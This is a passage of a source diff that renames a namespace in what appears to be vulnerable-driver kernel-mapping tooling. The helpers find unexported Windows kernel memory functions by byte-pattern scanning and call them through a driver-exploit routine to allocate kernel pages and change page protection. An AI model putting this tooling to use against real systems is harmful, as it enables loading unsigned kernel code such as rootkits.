-		kernel_MmAllocateIndependentPagesEx = intel_driver::FindPatternInSectionAtKernel((char*)".text", intel_driver::ntoskrnlAddr,
+		kernel_MmAllocateIndependentPagesEx = vdrv::FindPatternInSectionAtKernel((char*)".text", vdrv::ntoskrnlAddr,
 			(BYTE*)"\x41\x8B\xD6\xB9\x00\x10\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8",
 			(char*)"xxxxxxxxx????xxx");
 		if (!kernel_MmAllocateIndependentPagesEx)
@@ -1325,23 +1424,23 @@ uint64_t intel_driver::MmAllocateIndependentPagesEx(uint32_t size)
 			return 0;
 	}
 
-	if (!intel_driver::CallKernelFunction(&allocated_pages, kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0))
+	if (!vdrv::CallKernelFunction(&allocated_pages, kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0))
 		return 0;
 
 	return allocated_pages;
 }
 
-bool intel_driver::MmFreeIndependentPages(uint64_t address, uint32_t size)
+bool vdrv::MmFreeIndependentPages(uint64_t address, uint32_t size)
 {
 	static uint64_t kernel_MmFreeIndependentPages = 0;
 
 	if (!kernel_MmFreeIndependentPages)
 	{
-		kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr,
+		kernel_MmFreeIndependentPages = vdrv::FindPatternInSectionAtKernel("PAGE", vdrv::ntoskrnlAddr,
 			(BYTE*)"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF",
 			(char*)"xxxxxxxxx????xxxxxxx");
 		if (!kernel_MmFreeIndependentPages) {
-			kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr,
+			kernel_MmFreeIndependentPages = vdrv::FindPatternInSectionAtKernel("PAGE", vdrv::ntoskrnlAddr,
 				(BYTE*)"\x8B\x15\x00\x00\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B",
 				(char*)"xx????xxxx????xxx");
 
@@ -1360,10 +1459,10 @@ bool intel_driver::MmFreeIndependentPages(uint64_t address, uint32_t size)
 	}
 
 	uint64_t result{};
-	return intel_driver::CallKernelFunction(&result, kernel_MmFreeIndependentPages, address, size);
+	return vdrv::CallKernelFunction(&result, kernel_MmFreeIndependentPages, address, size);
 }
 
-BOOLEAN intel_driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect)
+BOOLEAN vdrv::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect)
 {
 	if (!address)
 		return FALSE;
@@ -1372,11 +1471,11 @@ BOOLEAN intel_driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG
 
 	if (!kernel_MmSetPageProtection)
 	{
-		kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel("PAGELK", intel_driver::ntoskrnlAddr,
+		kernel_MmSetPageProtection = vdrv::FindPatternInSectionAtKernel("PAGELK", vdrv::ntoskrnlAddr,
 			(BYTE*)"\x0F\x45\x00\x00\x8D\x00\x00\x00\xFF\xFF\xE8",
 			(char*)"xx??x???xxx");
 		if (!kernel_MmSetPageProtection) {
-			kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel("PAGELK", intel_driver::ntoskrnlAddr,
+			kernel_MmSetPageProtection = vdrv::FindPatternInSectionAtKernel("PAGELK", vdrv::ntoskrnlAddr,
 				(BYTE*)"\x0F\x45\x00\x00\x45\x8B\x00\x00\x00\x00\x8D\x00\x00\x00\x00\x00\x00\xFF\xFF\xE8",
 				(char*)"xx??xx????x???xxx");
 			if (!kernel_MmSetPageProtection)
@@ -1393,7 +1492,7 @@ BOOLEAN intel_driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG
 	}
 
 	BOOLEAN set_prot_status{};
-	if (!intel_driver::CallKernelFunction(&set_prot_status, kernel_MmSetPageProtection, address, size, new_protect))
+	if (!vdrv::CallKernelFunction(&set_prot_status, kernel_MmSetPageProtection, address, size, new_protect))
 		return FALSE;
 
 	return set_prot_status;
